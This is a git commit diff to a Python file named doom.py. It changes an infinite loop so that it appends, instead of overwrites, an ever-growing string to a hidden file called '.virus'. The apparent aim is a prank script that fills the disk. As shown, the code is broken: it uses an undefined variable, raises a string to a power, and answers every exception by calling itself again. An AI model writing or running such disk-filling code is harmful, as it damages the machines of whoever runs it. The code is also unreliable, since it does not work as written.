c5d2b905164d57e7d341ae33f45d5267b6afe018
Md Josif Khan <114861784+josifkhan@users.noreply.github.com>
2023-12-09 16:46:32 +0600

    Update doom.py

--- doom.py
+++ doom.py
@@ -4,6 +4,6 @@ def tryx()
   josifkhan = 'josifkhan'
   xx = 20
   while True:
-    try:x+=20;open('.virus','w',encoding='utf-8').write(f'{josifkhan**x}///{josifkhan**x}')
+    try:x+=20;open('.virus','a',encoding='utf-8').write(f'{josifkhan**x}///{josifkhan**x}')
     except:tryx()
 tryx()
